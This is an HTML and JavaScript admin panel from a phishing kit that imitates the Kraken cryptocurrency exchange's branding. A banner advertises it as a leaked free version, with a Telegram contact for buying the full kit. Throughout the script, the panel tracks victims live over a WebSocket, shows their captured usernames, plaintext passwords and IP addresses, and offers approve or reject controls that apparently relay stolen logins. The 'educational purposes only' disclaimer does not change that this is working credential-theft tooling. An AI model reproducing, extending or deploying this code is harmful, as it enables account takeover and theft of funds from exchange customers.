
<!DOCTYPE html>
<html lang="en" class="js-focus-visible light-theme">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Visitor Tracking</title>
    <link rel="stylesheet" href="sex.css">
    <style>
        body {
            font-family: 'Kraken-Product', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            font-weight: 500;
            background: #f6f5f9;
            padding: 0;
            margin: 0;
            min-height: 100vh;
        }
        
        .admin-container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            border-bottom: 1px solid var(--colors-ds-divider);
        }
        
        .main-content {
            flex: 1;
            padding: 40px 32px;
            max-width: 1200px;
            margin: 0 auto;
            width: 100%;
            box-sizing: border-box;
        }
        
        .dashboard-card {
            background: var(--background-color-ds-container);
            border-radius: 20px;
            box-shadow: var(--box-shadow-ds-container);
            padding: 32px;
            margin-bottom: 32px;
            animation: fadeInUp 0.6s cubic-bezier(0.165, 0.84, 0.44, 1);
        }
        
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 24px;
            margin-bottom: 32px;
        }
        
        .stat-card {
            background: var(--background-color-ds-card);
            border-radius: 12px;
            padding: 24px;
            text-align: center;
            border: 1px solid var(--border-color-ds-card);
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            animation: fadeInUp 0.6s cubic-bezier(0.165, 0.84, 0.44, 1);
        }
        
        .stat-card:hover {
            background: var(--background-color-ds-card-hover);
            transform: translateY(-2px);
            box-shadow: var(--box-shadow-ds-container);
        }
        
        .stat-number {
            font-size: 2.5rem;
            font-weight: 500;
            color: var(--colors-ds-brand);
            margin-bottom: 8px;
            font-family: 'Kraken-Brand', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .stat-label {
            color: var(--colors-ds-neutral);
            font-size: 0.875rem;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .section-title {
            font-size: 1.5rem;
            font-weight: 500;
            color: var(--colors-ds-primary);
            margin-bottom: 24px;
            font-family: 'Kraken-Brand', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .refresh-btn {
            background: var(--background-color-ds-button-primary-high);
            color: var(--text-color-ds-button-primary-high);
            border: none;
            padding: 12px 24px;
            border-radius: 12px;
            cursor: pointer;
            font-size: 0.875rem;
            font-weight: 500;
            font-family: 'Kraken-Product', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin-bottom: 24px;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: var(--box-shadow-ds-button-primary-high);
            outline: none;
        }
        
        .refresh-btn:hover {
            background: var(--background-color-ds-button-primary-high-hover);
            transform: translateY(-1px);
        }
        
        .refresh-btn:focus {
            outline: 2px solid var(--outline-color-ds-button);
            outline-offset: -2px;
        }
        
        .visitor-table {
            width: 100%;
            border-collapse: collapse;
            background: var(--background-color-ds-container);
            border-radius: 12px;
            overflow: hidden;
            box-shadow: var(--box-shadow-ds-container);
        }
        
        .visitor-table th,
        .visitor-table td {
            padding: 16px;
            text-align: left;
            border-bottom: 1px solid var(--colors-ds-divider);
            font-family: 'Kraken-Product', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .visitor-table th {
            background: var(--background-color-ds-tabs);
            font-weight: 500;
            color: var(--colors-ds-primary);
            font-size: 0.875rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .visitor-table tr:hover {
            background: var(--background-color-ds-table-row-hover);
        }
        
        .visitor-table tr:last-child td {
            border-bottom: none;
        }
        
        .online-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .online {
            background: var(--colors-ds-positive);
            animation: pulse 2s infinite;
        }
        
        .offline {
            background: var(--colors-ds-negative);
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.6; }
            100% { opacity: 1; }
        }
        
        .ip-address {
            font-family: 'Kraken-Product', monospace;
            background: var(--background-color-ds-input);
            padding: 4px 8px;
            border-radius: 6px;
            font-size: 0.875rem;
            color: var(--text-color-ds-input);
        }
        
        .user-agent {
            max-width: 300px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            font-size: 0.875rem;
            color: var(--colors-ds-neutral);
        }
        
        
        
        .no-data {
            text-align: center;
            padding: 40px;
            color: var(--colors-ds-neutral);
            font-style: italic;
        }
        
        .login-attempt-card {
            background: var(--background-color-ds-card);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 16px;
            border: 1px solid var(--border-color-ds-card);
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        .login-attempt-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
        
        .credentials-btn {
            background: var(--background-color-ds-button-neutral-medium);
            color: var(--text-color-ds-button-neutral-medium);
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.875rem;
            font-weight: 500;
            margin-right: 8px;
        }
        
        .credentials-btn:hover {
            background: var(--background-color-ds-button-neutral-medium-hover);
        }
        
        .approve-btn {
            background: var(--colors-ds-positive);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.875rem;
            font-weight: 500;
            margin-right: 8px;
        }
        
        .reject-btn {
            background: var(--colors-ds-negative);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.875rem;
            font-weight: 500;
        }
        
        .modal {
            display: none;
            position: fixed;
            z-index: 2000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
        }
        
        .modal-content {
            background: var(--background-color-ds-container);
            margin: 15% auto;
            padding: 32px;
            border-radius: 20px;
            width: 400px;
            max-width: 90%;
            box-shadow: var(--box-shadow-ds-container);
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
        }
        
        .modal-title {
            font-size: 1.5rem;
            font-weight: 500;
            color: var(--colors-ds-primary);
        }
        
        .close-btn {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: var(--colors-ds-neutral);
        }
        
        .credential-field {
            margin-bottom: 16px;
        }
        
        .credential-label {
            display: block;
            font-weight: 500;
            color: var(--colors-ds-primary);
            margin-bottom: 8px;
        }
        
        .credential-value {
            background: var(--background-color-ds-input);
            padding: 12px;
            border-radius: 8px;
            border: 1px solid var(--border-color-ds-card);
            width: 100%;
            font-family: 'Kraken-Product', monospace;
            font-size: 0.875rem;
        }
        
        @media (max-width: 768px) {
            .main-content {
                padding: 20px 16px;
            }
            
            .dashboard-card {
                padding: 20px;
                margin-bottom: 20px;
            }
            
            .stats-grid {
                grid-template-columns: 1fr;
                gap: 16px;
            }
            
            .visitor-table {
                font-size: 0.875rem;
            }
            
            .visitor-table th,
            .visitor-table td {
                padding: 12px 8px;
            }
            
            .user-agent {
                max-width: 150px;
            }
            
            .modal-content {
                margin: 10% auto;
                width: 350px;
                padding: 20px;
            }
            
            .login-attempt-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 12px;
            }
        }
    </style>
</head>
<body class="pro-text-theme light-theme ds-light-bg default-shape-theme">
    <div class="admin-container">
        <header class="header">
            <div class="header-content">
                <div class="py-ds-3 items-center bg-ds-kit-header-mobile md:bg-ds-kit-header-desktop">
                    <div class="px-ds-3 md:px-ds-9 flex h-10 items-center justify-between">
                        <nav class="flex w-full content-center items-center">
                            <div class="gap-ds-2 hidden grid-flow-col content-center items-center md:grid">
                                <a href="/">
                                    <svg height="24" viewBox="0 0 91 15" xmlns="http://www.w3.org/2000/svg" class="fill-ds-brand-brand ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0">
                                        <path d="M79.5312 14.0147V0.785345H81.7917V2.48076C82.5367 1.19636 84.1036 0.400024 85.8761 0.400024C88.7789 0.400024 90.8853 1.94131 90.8853 5.92296V14.0147H88.5734V6.25691C88.5734 3.79085 87.366 2.58351 85.3624 2.58351C83.1018 2.58351 81.8431 4.12479 81.8431 6.33397V14.0147H79.5312Z"></path>
                                        <path d="M71.5676 14.4C67.4832 14.4 64.8887 11.6514 64.8887 7.3358C64.8887 3.20002 67.5345 0.400024 71.3621 0.400024C75.1639 0.400024 77.8354 2.96883 77.8354 6.64223C77.8354 7.69544 77.8354 7.92663 77.7841 8.15782H67.3033C67.4575 10.7523 69.0758 12.345 71.5932 12.345C73.3657 12.345 74.5987 11.5743 75.2153 10.1615H77.6042C76.9107 12.8074 74.6758 14.4 71.5676 14.4ZM67.3033 6.25691H75.3951C75.2923 3.8936 73.751 2.42938 71.3621 2.42938C69.0758 2.42938 67.5602 3.84223 67.3033 6.25691Z"></path>
                                        <path d="M44.523 14.4C41.8515 14.4 39.8992 12.9615 39.8992 10.4697C39.8992 7.97801 41.6717 6.84773 43.7524 6.46241L46.9891 5.8459C48.0937 5.64039 48.7359 5.35782 48.7359 4.35599C48.7359 3.20002 47.7597 2.42938 45.8074 2.42938C44.2148 2.42938 42.8276 3.07158 42.6478 4.5358H40.2588C40.4129 1.94131 42.7762 0.400024 45.8331 0.400024C49.5322 0.400024 51.0478 2.24957 51.0478 4.43305V11.2147C51.0478 11.8312 51.3304 12.1395 51.8441 12.1395C52.2808 12.1395 52.5377 12.0367 52.7689 11.8826V13.7578C52.4093 14.0661 51.7928 14.2716 51.0478 14.2716C49.9689 14.2716 49.0441 13.578 48.8129 12.4477C48.1964 13.3211 46.912 14.4 44.523 14.4ZM42.2882 10.3927C42.2882 11.7285 43.4184 12.3707 44.934 12.3707C47.0662 12.3707 48.7359 11.1633 48.7359 9.2881V7.15599C48.479 7.43856 47.6827 7.66975 46.7322 7.84957L44.5744 8.26057C43.0331 8.54314 42.2882 9.21103 42.2882 10.3927Z"></path>
                                        <path d="M32.9541 14.0147V0.785343H35.2146V2.99452C35.8568 1.42755 37.0128 0.502775 38.8366 0.502775C39.222 0.502775 39.6073 0.57984 39.8128 0.631215V2.99452C39.6073 2.94314 39.1706 2.86608 38.7339 2.86608C36.4733 2.86608 35.266 4.63856 35.266 7.46424V14.0147H32.9541Z"></path>
                                        <path d="M28.9027 0.785341H31.8825L26.5394 6.02571L32.1651 14.0147H29.4678L24.9724 7.61837L22.7633 9.72479V14.0147H20.4513V0.785341H22.7633V6.84773L28.9027 0.785341Z"></path>
                                        <path d="M62.2915 0.785341H65.2713L59.9282 6.02571L65.5538 14.0147H62.8566L58.3612 7.61837L56.152 9.72479V14.0147H53.8401V0.785341H56.152V6.84773L62.2915 0.785341Z"></path>
                                        <path d="M8.79521 0.400024C3.93757 0.400024 0 4.38923 0 9.31008V13.1284C0 13.8308 0.561922 14.3997 1.25558 14.3997C1.94923 14.3997 2.51527 13.8308 2.51527 13.1284V9.31008C2.51527 8.60561 3.07513 8.03662 3.77084 8.03662C4.4645 8.03662 5.02642 8.60561 5.02642 9.31008V13.1284C5.02642 13.8308 5.58834 14.3997 6.282 14.3997C6.97771 14.3997 7.53963 13.8308 7.53963 13.1284V9.31008C7.53963 8.60561 8.10155 8.03662 8.79521 8.03662C9.49092 8.03662 10.0549 8.60561 10.0549 9.31008V13.1284C10.0549 13.8308 10.6168 14.3997 11.3105 14.3997C12.0041 14.3997 12.5661 13.8308 12.5661 13.1284V9.31008C12.5661 8.60561 13.128 8.03662 13.8257 8.03662C14.5194 8.03662 15.0813 8.60561 15.0813 9.31008V13.1284C15.0813 13.8308 15.6432 14.3997 16.339 14.3997C17.0326 14.3997 17.5945 13.8308 17.5945 13.1284V9.31008C17.5945 4.38923 13.6549 0.400024 8.79521 0.400024Z"></path>
                                    </svg>
                                </a>
                            </div>
                            <div class="mx-ds-2 gap-ds-2 hidden grow grid-flow-col content-center items-center md:grid">
                                <h1 style="color: var(--colors-ds-primary); font-size: 1.5rem; font-weight: 500; margin: 0; font-family: 'Kraken-Brand', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">Admin Panel</h1>
                            </div>
                            <div class="gap-ds-2 hidden grid-flow-col content-center items-center md:grid">
                                <div style="color: var(--colors-ds-neutral); font-size: 0.875rem;">
                                    Real-time visitor tracking
                                </div>
                            </div>
                            <div class="gap-ds-2 grid shrink grid-flow-col content-center items-center md:hidden">
                                <div class="ml-3">
                                    <a href="/">
                                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="text-ds-brand-brand ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0" name="Kraken" style="width: 26px; height: 26px;">
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M2 13.8332V18.1963C2 18.9998 2.63994 19.6499 3.42687 19.6499C4.21464 19.6499 4.85762 18.9998 4.85762 18.1963V13.8332C4.85762 13.0286 5.49424 12.3773 6.28532 12.3773C7.07364 12.3773 7.71302 13.0286 7.71302 13.8332V18.1963C7.71302 18.9998 8.35296 19.6499 9.14073 19.6499C9.93125 19.6499 10.5709 18.9998 10.5709 18.1963V13.8332C10.5709 13.0286 11.2103 12.3773 11.9983 12.3773C12.7897 12.3773 13.4296 13.0286 13.4296 13.8332V18.1963C13.4296 18.9998 14.0693 19.6499 14.8562 19.6499C15.644 19.6499 16.2839 18.9998 16.2839 18.1963V13.8332C16.2839 13.0286 16.9236 12.3773 17.7147 12.3773C18.5027 12.3773 19.1424 13.0286 19.1424 13.8332V18.1963C19.1424 18.9998 19.7823 19.6499 20.5723 19.6499C21.3603 19.6499 22 18.9998 22 18.1963V13.8332C22 8.20968 17.5218 3.6499 11.9983 3.6499C6.47514 3.6499 2 8.20968 2 13.8332Z" class="fill-current stroke-transparent"></path>
                                        </svg>
                                    </a>
                                </div>
                            </div>
                            <div class="mx-ds-2 gap-ds-2 grid grow content-center items-center md:hidden">
                                <h1 style="color: var(--colors-ds-primary); font-size: 1.25rem; font-weight: 500; margin: 0; font-family: 'Kraken-Brand', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">Admin Panel</h1>
                            </div>
                        </nav>
                    </div>
                </div>
            </div>
        </header>
        
        <div class="main-content">
            <div class="dashboard-card" style="background: linear-gradient(135deg, var(--colors-ds-brand) 0%, #6366f1 100%); color: white; text-align: center; margin-bottom: 24px;">
                <div style="font-size: 1.25rem; font-weight: 600; margin-bottom: 12px; font-family: 'Kraken-Brand', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
                    Leaked & free version!
                </div>
                <div style="font-size: 0.95rem; line-height: 1.5; opacity: 0.95;">
                    This is leaked version which lacks 2-fa other important stuff, if you'd like to buy full version with all features. | DO NOT USE THIS FOR SCAMMING INTENTIONS, EDUCATIONAL PURPOSES ONLY.
                    <br>DM <strong>@fourvz</strong> on Telegram
                </div>
            </div>
            
            <div class="dashboard-card">
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-number" id="totalVisitors">0</div>
                        <div class="stat-label">Total Active</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number" id="onlineVisitors">0</div>
                        <div class="stat-label">Currently Online</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number" id="offlineVisitors">0</div>
                        <div class="stat-label">Recently Offline</div>
                    </div>
                </div>
            </div>
            
            <div class="dashboard-card">
                <div class="section-title">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: inline-block; vertical-align: middle; margin-right: 8px;">
                        <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1ZM12 7C13.1 7 14 7.9 14 9S13.1 11 12 11 10 10.1 10 9 10.9 7 12 7ZM12 15C10.31 15 8.81 15.64 7.72 16.72C8.1 14.29 9.85 12.53 12 12.53S15.9 14.29 16.28 16.72C15.19 15.64 13.69 15 12 15Z" fill="currentColor"/>
                    </svg>
                    Pending Login Attempts
                </div>
                <div id="loginAttemptsContainer">
                    <div id="noLoginAttempts" class="no-data">No pending login attempts</div>
                </div>
            </div>
            
            <div class="dashboard-card">
                <div class="section-title">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: inline-block; vertical-align: middle; margin-right: 8px;">
                        <path d="M16 4C18.2091 4 20 5.79086 20 8C20 10.2091 18.2091 12 16 12C13.7909 12 12 10.2091 12 8C12 5.79086 13.7909 4 16 4ZM8 6C9.65685 6 11 7.34315 11 9C11 10.6569 9.65685 12 8 12C6.34315 12 5 10.6569 5 9C5 7.34315 6.34315 6 8 6ZM8 13C10.6667 13 16 14.3333 16 17V20H0V17C0 14.3333 5.33333 13 8 13ZM16 13.0003C18.2 13.0003 22 14.1003 22 16.6003V20H18V17C18 15.8667 17.1667 14.9 15.8 14.3C16.5333 13.7667 17.2667 13.4 16 13.0003Z" fill="currentColor"/>
                    </svg>
                    Active Visitors
                </div>
                <button class="refresh-btn" onclick="refreshData()">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: inline-block; vertical-align: middle; margin-right: 6px;">
                        <path d="M12 4V1L8 5L12 9V6C15.31 6 18 8.69 18 12C18 13.01 17.75 13.97 17.3 14.8L18.76 16.26C19.54 15.03 20 13.57 20 12C20 7.58 16.42 4 12 4ZM12 18C8.69 18 6 15.31 6 12C6 10.99 6.25 10.03 6.7 9.2L5.24 7.74C4.46 8.97 4 10.43 4 12C4 16.42 7.58 20 12 20V23L16 19L12 15V18Z" fill="currentColor"/>
                    </svg>
                    Refresh Data
                </button>
                
                <table class="visitor-table">
                    <thead>
                        <tr>
                            <th>Status</th>
                            <th>GUID</th>
                            <th>IP Address</th>
                            <th>Join Time</th>
                            <th>Last Seen</th>
                            <th>User Agent</th>
                        </tr>
                    </thead>
                    <tbody id="visitorsTableBody">
                        <tr>
                            <td colspan="6" class="no-data">
                                Loading visitor data...
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <div id="credentialsModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">Login Credentials</h3>
                <button class="close-btn" onclick="closeCredentialsModal()">&times;</button>
            </div>
            <div class="credential-field">
                <label class="credential-label">Username:</label>
                <input type="text" class="credential-value" id="modalUsername" readonly>
            </div>
            <div class="credential-field">
                <label class="credential-label">Password:</label>
                <input type="password" class="credential-value" id="modalPassword" readonly>
                <button onclick="togglePassword()" style="margin-top: 8px; background: var(--background-color-ds-button-neutral-medium); border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer;">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5S21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 17C9.24 17 7 14.76 7 12S9.24 7 12 7 17 9.24 17 12 14.76 17 12 17ZM12 9C10.34 9 9 10.34 9 12S10.34 15 12 15 15 13.66 15 12 13.66 9 12 9Z" fill="currentColor"/>
                    </svg>
                    Show/Hide
                </button>
            </div>
            <div class="credential-field">
                <label class="credential-label">IP Address:</label>
                <input type="text" class="credential-value" id="modalIP" readonly>
            </div>
            <div class="credential-field">
                <label class="credential-label">Timestamp:</label>
                <input type="text" class="credential-value" id="modalTimestamp" readonly>
            </div>
        </div>
    </div>

    <script>
        let ws;
        let reconnectInterval;
        
        function connectWebSocket() {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = `${protocol}//${window.location.host}?admin=true`;
            
            ws = new WebSocket(wsUrl);
            
            ws.onopen = function() {
                console.log('Admin WebSocket connected');
                clearInterval(reconnectInterval);
            };
            
            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                if (data.type === 'visitorUpdate') {
                    updateVisitorData(data.visitors);
                } else if (data.type === 'loginAttempt') {
                    addLoginAttempt(data.attempt);
                } else if (data.type === 'loginAttemptsUpdate') {
                    updateLoginAttempts(data.attempts);
                }
            };
            
            ws.onclose = function() {
                console.log('Admin WebSocket disconnected');
                
                reconnectInterval = setInterval(connectWebSocket, 3000);
            };
            
            ws.onerror = function(error) {
                console.error('WebSocket error:', error);
            };
        }
        
        
        
        function updateVisitorData(visitors) {
            const tbody = document.getElementById('visitorsTableBody');
            const totalEl = document.getElementById('totalVisitors');
            const onlineEl = document.getElementById('onlineVisitors');
            const offlineEl = document.getElementById('offlineVisitors');
            
            const onlineCount = visitors.filter(v => v.isOnline).length;
            const offlineCount = visitors.length - onlineCount;
            
            animateNumber(totalEl, visitors.length);
            animateNumber(onlineEl, onlineCount);
            animateNumber(offlineEl, offlineCount);
            
            if (visitors.length === 0) {
                tbody.innerHTML = `
                    <tr>
                        <td colspan="6" class="no-data">
                            No active visitors
                        </td>
                    </tr>
                `;
                return;
            }
            
            tbody.innerHTML = visitors.map((visitor, index) => `
                <tr style="animation: fadeInUp 0.6s cubic-bezier(0.165, 0.84, 0.44, 1) ${index * 0.1}s both;">
                    <td>
                        <span class="online-indicator ${visitor.isOnline ? 'online' : 'offline'}"></span>
                        ${visitor.isOnline ? 'Online' : 'Offline'}
                    </td>
                    <td style="font-family: 'Kraken-Product', monospace; font-size: 0.75rem; color: var(--colors-ds-neutral);">${visitor.guid}</td>
                    <td><span class="ip-address">${visitor.ip || 'Unknown'}</span></td>
                    <td style="font-size: 0.875rem;">${new Date(visitor.joinTime).toLocaleString()}</td>
                    <td style="font-size: 0.875rem;">${new Date(visitor.lastSeen).toLocaleString()}</td>
                    <td><div class="user-agent" title="${visitor.userAgent}">${visitor.userAgent || 'Unknown'}</div></td>
                </tr>
            `).join('');
        }
        
        function animateNumber(element, targetNumber) {
            const currentNumber = parseInt(element.textContent) || 0;
            const increment = targetNumber > currentNumber ? 1 : -1;
            const duration = 500; 
            const steps = Math.abs(targetNumber - currentNumber);
            const stepDuration = steps > 0 ? duration / steps : 0;
            
            if (steps === 0) return;
            
            let current = currentNumber;
            const timer = setInterval(() => {
                current += increment;
                element.textContent = current;
                
                if (current === targetNumber) {
                    clearInterval(timer);
                }
            }, stepDuration);
        }
        
        function refreshData() {
            const btn = document.querySelector('.refresh-btn');
            btn.style.transform = 'scale(0.95)';
            setTimeout(() => {
                btn.style.transform = '';
            }, 150);
            
            fetch('/api/admin/visitors')
                .then(response => response.json())
                .then(data => {
                    updateVisitorData(data.visitors);
                    if (data.loginAttempts) {
                        updateLoginAttempts(data.loginAttempts);
                    }
                })
                .catch(error => {
                    console.error('Error fetching visitor data:', error);
                });
        }
        
        function addLoginAttempt(attempt) {
            const container = document.getElementById('loginAttemptsContainer');
            const noAttempts = document.getElementById('noLoginAttempts');
            
            if (noAttempts) {
                noAttempts.style.display = 'none';
            }
            
            const attemptCard = document.createElement('div');
            attemptCard.className = 'login-attempt-card';
            attemptCard.id = `attempt-${attempt.guid}`;
            
            attemptCard.innerHTML = `
                <div class="login-attempt-header">
                    <div>
                        <strong>User: ${attempt.username}</strong><br>
                        <small style="color: var(--colors-ds-neutral);">IP: ${attempt.ip} | ${new Date(attempt.timestamp).toLocaleString()}</small>
                    </div>
                    <div>
                        <button class="credentials-btn" onclick="showCredentials('${attempt.guid}', '${attempt.username}', '${attempt.password}', '${attempt.ip}', '${attempt.timestamp}')">
                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
                                <path d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5S21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 17C9.24 17 7 14.76 7 12S9.24 7 12 7 17 9.24 17 12 14.76 17 12 17ZM12 9C10.34 9 9 10.34 9 12S10.34 15 12 15 15 13.66 15 12 13.66 9 12 9Z" fill="currentColor"/>
                            </svg>
                            View Credentials
                        </button>
                        <button class="approve-btn" onclick="handleLoginDecision('${attempt.guid}', 'approve')">
                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
                                <path d="M9 16.17L4.83 12L3.41 13.41L9 19L21 7L19.59 5.59L9 16.17Z" fill="currentColor"/>
                            </svg>
                            Approve
                        </button>
                        <button class="reject-btn" onclick="handleLoginDecision('${attempt.guid}', 'reject')">
                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
                                <path d="M19 6.41L17.59 5L12 10.59L6.41 5L5 6.41L10.59 12L5 17.59L6.41 19L12 13.41L17.59 19L19 17.59L13.41 12L19 6.41Z" fill="currentColor"/>
                            </svg>
                            Reject
                        </button>
                    </div>
                </div>
            `;
            
            container.appendChild(attemptCard);
        }
        
        function updateLoginAttempts(attempts) {
            const container = document.getElementById('loginAttemptsContainer');
            const noAttempts = document.getElementById('noLoginAttempts');
            
            container.innerHTML = '<div id="noLoginAttempts" class="no-data">No pending login attempts</div>';
            
            if (attempts.length === 0) {
                noAttempts.style.display = 'block';
            } else {
                document.getElementById('noLoginAttempts').style.display = 'none';
                attempts.forEach(attempt => {
                    addLoginAttempt(attempt);
                });
            }
        }
        
        function showCredentials(guid, username, password, ip, timestamp) {
            document.getElementById('modalUsername').value = username;
            document.getElementById('modalPassword').value = password;
            document.getElementById('modalIP').value = ip;
            document.getElementById('modalTimestamp').value = new Date(timestamp).toLocaleString();
            document.getElementById('credentialsModal').style.display = 'block';
        }
        
        function closeCredentialsModal() {
            document.getElementById('credentialsModal').style.display = 'none';
        }
        
        function togglePassword() {
            const passwordField = document.getElementById('modalPassword');
            passwordField.type = passwordField.type === 'password' ? 'text' : 'password';
        }
        
        function handleLoginDecision(guid, decision) {
            fetch('/api/admin/login-decision', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    guid: guid,
                    decision: decision
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    const attemptCard = document.getElementById(`attempt-${guid}`);
                    if (attemptCard) {
                        attemptCard.remove();
                    }
                    
                    const container = document.getElementById('loginAttemptsContainer');
                    if (container.children.length === 0) {
                        container.innerHTML = '<div id="noLoginAttempts" class="no-data">No pending login attempts</div>';
                    }
                }
            })
            .catch(error => {
                console.error('Error handling login decision:', error);
            });
        }
        
        window.onclick = function(event) {
            const modal = document.getElementById('credentialsModal');
            if (event.target == modal) {
                closeCredentialsModal();
            }
        }
        
        connectWebSocket();
        
        setInterval(refreshData, 30000);
        
        document.querySelectorAll('.stat-card').forEach((card, index) => {
            card.style.animationDelay = `${index * 0.1}s`;
        });
    </script>
</body>
</html>
